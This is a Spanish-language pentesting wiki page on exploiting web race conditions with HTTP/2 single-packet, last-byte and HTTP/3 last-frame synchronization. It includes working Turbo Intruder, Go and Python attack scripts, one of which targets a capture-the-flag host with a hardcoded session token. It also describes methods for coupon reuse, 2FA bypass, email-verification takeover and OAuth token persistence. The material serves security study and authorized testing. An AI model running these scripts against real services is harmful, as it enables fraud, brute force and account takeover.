# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Para obtener una comprensión profunda de esta técnica consulta el informe original en [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Mejorando ataques de Race Condition

El principal obstáculo para aprovechar race conditions es asegurarse de que múltiples solicitudes se procesen al mismo tiempo, con una diferencia en sus tiempos de procesamiento muy pequeña — idealmente, menos de 1 ms.

Aquí encontrarás algunas técnicas para sincronizar solicitudes:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Soporta el envío de dos requests sobre una sola conexión TCP, reduciendo el impacto del jitter de red. Sin embargo, debido a variaciones del lado del servidor, dos requests pueden no ser suficientes para un exploit de race condition consistente.
- **HTTP/1.1 'Last-Byte Sync'**: Permite pre-enviar la mayor parte de 20-30 requests, reteniendo un pequeño fragmento que luego se envía junto, logrando la llegada simultánea al servidor.

**Preparation for Last-Byte Sync** involves:

1. Enviar los headers y los datos del body menos el byte final sin cerrar el stream.
2. Pausar 100 ms después del envío inicial.
3. Desactivar TCP_NODELAY para aprovechar Nagle's algorithm y agrupar los frames finales.
4. Enviar pings para calentar la conexión.

El envío posterior de los frames retenidos debería provocar su llegada en un único paquete, verificable con Wireshark. Este método no se aplica a archivos estáticos, que normalmente no participan en ataques RC.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3 corre sobre QUIC (UDP). No existe la coalescencia de TCP ni Nagle en la que confiar, por lo que el clásico last‑byte sync no funciona con clientes estándar. En su lugar, necesitas coalescer deliberadamente múltiples QUIC stream‑final DATA frames (FIN) en el mismo datagrama UDP para que el servidor procese todas las requests objetivo en el mismo tick de programación.
- **How to do it**: Usa una librería diseñada a medida que exponga el control de frames QUIC. Por ejemplo, H3SpaceX manipula quic-go para implementar HTTP/3 last‑frame synchronization tanto para requests con body como para requests estilo GET sin body.
- Requests‑with‑body: enviar HEADERS + DATA menos el último byte para N streams, luego flush del byte final de cada stream juntos.
- GET‑style: fabricar DATA frames falsos (o un body pequeño con Content‑Length) y terminar todos los streams en un solo datagrama.
- **Practical limits**:
- La concurrencia está limitada por el parámetro de transporte QUIC max_streams del peer (similar a SETTINGS_MAX_CONCURRENT_STREAMS de HTTP/2). Si es bajo, abre múltiples conexiones H3 y reparte la carrera entre ellas.
- El tamaño del datagrama UDP y la path MTU limitan cuántos stream‑final frames puedes coalescer. La librería gestiona el splitting en varios datagramas si es necesario, pero un flush en un solo datagrama es lo más fiable.
- **Practice**: Hay laboratorios públicos de race H2/H3 y exploits de ejemplo que acompañan a H3SpaceX.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) ejemplo mínimo</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Adaptación a la arquitectura del servidor

Entender la arquitectura del objetivo es crucial. Los servidores front-end pueden enrutar las solicitudes de manera diferente, lo que afecta la temporización. El precalentamiento de conexiones del lado del servidor, mediante solicitudes inconsecuentes, puede normalizar la temporización de las peticiones.

#### Manejo de Session-Based Locking

Frameworks como el session handler de PHP serializan las solicitudes por session, lo que potencialmente oculta vulnerabilidades. Utilizar diferentes session tokens para cada solicitud puede evitar este problema.

#### Superar límites de Rate o Resource

Si el connection warming no es efectivo, provocar intencionadamente retrasos en los límites de rate o recursos del servidor web mediante una avalancha de solicitudes dummy podría facilitar el single-packet attack al inducir una demora del lado del servidor propicia para condiciones de race.

## Ejemplos de ataque

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: You can send the request to **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), you can change in the request the value you want to brute force for **`%s`** like in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` and then select the **`examples/race-single-packer-attack.py`** from the drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

If you are going to **send different values**, you could modify the code with this one that uses a wordlist from the clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Si el web no soporta HTTP2 (solo HTTP1.1) usa `Engine.THREADED` o `Engine.BURP` en lugar de `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: En caso de que necesites enviar una solicitud a 1 endpoint y luego varias a otros endpoints para desencadenar el RCE, puedes cambiar el `race-single-packet-attack.py` script con algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- También está disponible en **Repeater** mediante la nueva opción '**Send group in parallel**' en Burp Suite.
- Para **limit-overrun** podrías simplemente añadir la **misma request 50 veces** en el grupo.
- Para **connection warming**, podrías **agregar** al **comienzo** del **grupo** algunas **requests** a alguna parte no estática del servidor web.
- Para **delaying** el proceso **entre** el procesamiento de **una request y otra** en un flujo de 2 subestados, podrías **añadir requests extra entre** ambas requests.
- Para un **multi-endpoint** RC podrías comenzar enviando la **request** que **va al estado oculto** y luego **50 requests** inmediatamente después que **exploten el estado oculto**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: El objetivo de este script es cambiar el email de un usuario mientras lo verifica continuamente hasta que el token de verificación del nuevo email llegue al último email (esto es porque en el código se observó un RC donde era posible modificar un email pero que la verificación se enviara al antiguo porque la variable que indicaba el email ya estaba poblada con el primero).\
Cuando la palabra "objetivo" se encuentra en los emails recibidos, sabemos que hemos recibido el token de verificación del email cambiado y terminamos el ataque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: notas sobre el engine y gating

- Selección de engine: usa `Engine.BURP2` en objetivos HTTP/2 para activar el single‑packet attack; como alternativa, usa `Engine.THREADED` o `Engine.BURP` para el last‑byte sync en HTTP/1.1.
- `gate`/`openGate`: pon muchas copias en cola con `gate='race1'` (o gates por intento), lo que retiene la cola (tail) de cada petición; `openGate('race1')` vacía todos los tails juntos para que lleguen casi al mismo tiempo.
- Diagnóstico: las marcas de tiempo negativas en Turbo Intruder indican que el servidor respondió antes de que la petición se hubiera enviado por completo, lo que demuestra solapamiento. Esto es esperado en condiciones de carrera reales.
- Calentamiento de la conexión: envía un ping o unas cuantas peticiones inofensivas primero para estabilizar los tiempos; opcionalmente desactiva `TCP_NODELAY` para favorecer el batching de los frames finales.


### Mejorando el Single Packet Attack

In the original research it's explained that this attack has a limit of 1,500 bytes. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it was explained how it's possible to extend the 1,500-byte limitation of the single packet attack to the **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) and sending them in different order, allowed to prevent reassembling the packet until all the fragments reached the server. This technique allowed the researcher to send 10,000 requests in about 166ms.

Ten en cuenta que, aunque esta mejora hace el ataque más fiable en RC que requiere cientos/miles de paquetes para llegar al mismo tiempo, también puede tener algunas limitaciones a nivel de software. Algunos servidores HTTP populares como Apache, Nginx y Go tienen un `SETTINGS_MAX_CONCURRENT_STREAMS` estricto fijado en 100, 128 y 250. Sin embargo, otros como NodeJS y nghttp2 lo tienen ilimitado.\
Esto básicamente significa que Apache solo considerará 100 conexiones HTTP desde una única conexión TCP (limitando este ataque RC). Para HTTP/3, el límite análogo es el parámetro de transporte de QUIC `max_streams` — si es pequeño, distribuye tu race a través de múltiples conexiones QUIC.

Puedes encontrar algunos ejemplos usando esta técnica en el repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Antes de la investigación mencionada, estos eran algunos payloads usados que solo intentaban enviar los paquetes lo más rápido posible para causar una RC.

- **Repeater:** Revisa los ejemplos de la sección anterior.
- **Intruder**: Envía la **request** a **Intruder**, ajusta el **number of threads** a **30** dentro del **Options menu**, selecciona como payload **Null payloads** y genera **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Este es el tipo más básico de race condition donde **vulnerabilidades** **aparecen** en lugares que **limitan el número de veces que puedes realizar una acción**. Como usar el mismo código de descuento en una tienda web varias veces. Un ejemplo muy sencillo puede encontrarse en [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) o en [**this bug**](https://hackerone.com/reports/759247)**.**

Hay muchas variaciones de este tipo de ataque, incluyendo:

- Canjear una tarjeta regalo varias veces
- Calificar un producto varias veces
- Retirar o transferir efectivo en exceso del saldo de tu cuenta
- Reutilizar la solución de un único CAPTCHA
- Eludir un rate limit anti-brute-force

### **Subestados ocultos**

Explotar race conditions complejas a menudo implica aprovechar breves oportunidades para interactuar con subestados de máquina **no intencionados**. Así es como abordarlo:

1. **Identificar posibles subestados ocultos**
- Empieza por localizar endpoints que modifiquen o interactúen con datos críticos, como perfiles de usuario o procesos de restablecimiento de contraseña. Enfócate en:
- **Storage**: Prefiere endpoints que manipulen datos persistentes del lado del servidor en lugar de los que manejan datos del lado del cliente.
- **Action**: Busca operaciones que alteren datos existentes, que son más propensas a crear condiciones explotables en comparación con las que añaden nuevos datos.
- **Keying**: Los ataques exitosos suelen implicar operaciones indexadas por el mismo identificador, p. ej., nombre de usuario o token de restablecimiento.
2. **Realizar sondeos iniciales**
- Prueba los endpoints identificados con ataques de race condition, observando cualquier desviación respecto a los resultados esperados. Respuestas inesperadas o cambios en el comportamiento de la aplicación pueden indicar una vulnerabilidad.
3. **Demostrar la vulnerabilidad**
- Reduce el ataque al número mínimo de solicitudes necesario para explotarlo, a menudo solo dos. Este paso puede requerir varios intentos o automatización debido a la sincronización precisa implicada.

### Time Sensitive Attacks

La precisión en la sincronización de solicitudes puede revelar vulnerabilidades, especialmente cuando se usan métodos predecibles como timestamps para tokens de seguridad. Por ejemplo, generar password reset tokens basados en timestamps podría permitir tokens idénticos para solicitudes simultáneas.

**To Exploit:**

- Usa una sincronización precisa, como un ataque de un solo paquete, para realizar solicitudes de password reset concurrentes. Tokens idénticos indican una vulnerabilidad.

**Example:**

- Solicita dos password reset tokens al mismo tiempo y compáralos. Tokens coincidentes sugieren un fallo en la generación de tokens.

**Consulta** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **para probar esto.**

## Casos de estudio de subestados ocultos

### Pagar y añadir un artículo

Consulta [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver cómo **pagar** en una tienda y **añadir un artículo extra** que **no tendrás que pagar**.

### Confirmar otros emails

La idea es **verificar una dirección de email y cambiarla por otra al mismo tiempo** para averiguar si la plataforma verifica la nueva dirección.

### Change email to 2 emails addresses Cookie based

Según [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab fue vulnerable a un takeover de esta manera porque podría **enviar** el **email verification token de un email a otro email**.

**Consulta** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **para probar esto.**

### Hidden Database states / Confirmation Bypass

Si se usan **2 escrituras diferentes** para **añadir** **información** dentro de una **base de datos**, hay un pequeño intervalo de tiempo donde **solo los primeros datos han sido escritos** dentro de la base de datos. Por ejemplo, al crear un usuario el **nombre de usuario** y la **contraseña** podrían ser **escritos** y **luego el token** para confirmar la cuenta recién creada es escrito. Esto significa que durante un breve tiempo el **token para confirmar una cuenta es null**.

Por lo tanto, **registrar una cuenta y enviar varias solicitudes con un token vacío** (`token=` or `token[]=` or any other variation) para confirmar la cuenta de inmediato podría permitir **confirmar una cuenta** en la que no controlas el email.

**Consulta** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **para probar esto.**

### Bypass 2FA

El siguiente pseudo-code es vulnerable a race condition porque en un lapso muy corto la **2FA no se aplica** mientras se crea la sesión:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Persistencia eterna de OAuth2

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Estos servicios te permitirán crear una aplicación y autenticar usuarios que el proveedor ha registrado. Para hacerlo, el **client** necesitará **permitir que tu aplicación** acceda a algunos de sus datos dentro del **OAUth provider**.\
So, until here just a common login with google/linkedin/github... where you are prompted with a page saying: "_Application <InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

El **problema** aparece cuando lo **aceptas** y automáticamente envía un **`authorization_code`** a la aplicación maliciosa. Luego, esta **aplicación abusa de una Race Condition en el OAUth service provider para generar más que un AT/RT** (_Authentication Token/Refresh Token_) a partir del **`authorization_code`** de tu cuenta. Básicamente, abusará del hecho de que aceptaste que la aplicación acceda a tus datos para **crear varias cuentas**. Entonces, si dejas de permitir que la aplicación acceda a tus datos, un par de AT/RT será eliminado, pero los otros seguirán siendo válidos.

#### Race Condition in `Refresh Token`

Una vez que hayas **obtenido un RT válido** podrías intentar **abusar de él para generar varios AT/RT** e **incluso si el usuario cancela los permisos** para que la aplicación maliciosa acceda a sus datos, **varios RTs seguirán siendo válidos.**

## **RC in WebSockets**

- En [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) puedes encontrar un PoC en Java para enviar websocket messages en **parallel** y abusar de **Race Conditions también en Web Sockets**.
- Con Burp’s WebSocket Turbo Intruder puedes usar el motor **THREADED** para crear múltiples conexiones WS y disparar payloads en paralelo. Parte del ejemplo oficial y ajusta `config()` (thread count) para la concurrencia; esto suele ser más fiable que agrupar en una sola conexión cuando compites por el estado del servidor a través de los handlers WS. Ver [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
